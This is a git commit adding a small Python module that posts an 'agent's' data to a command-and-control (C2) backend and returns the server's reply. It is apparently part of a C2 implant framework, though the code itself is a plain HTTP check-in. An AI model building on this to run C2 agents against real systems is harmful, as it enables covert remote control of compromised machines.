389aada6377388b9ece3854f5c8db61c54cf69db
djalv <alvaroneto98@protonmail.com>
2025-10-12 17:38:59 -0300

    feat: Added communication module with C2 backend

---
+++ src/agent/comms.py
@@ -0,0 +1,16 @@
+import requests
+import json
+
+
+def perform_checkin(api_url, agent_data):
+    try:
+        response = requests.post(api_url, json=agent_data, timeout=10)
+
+        response.raise_for_status()
+
+        return response.json()
+
+    except requests.exceptions.RequestException as e:
+        print(f"[ERROR] Error in communication with C2: {e}")
+
+        return None
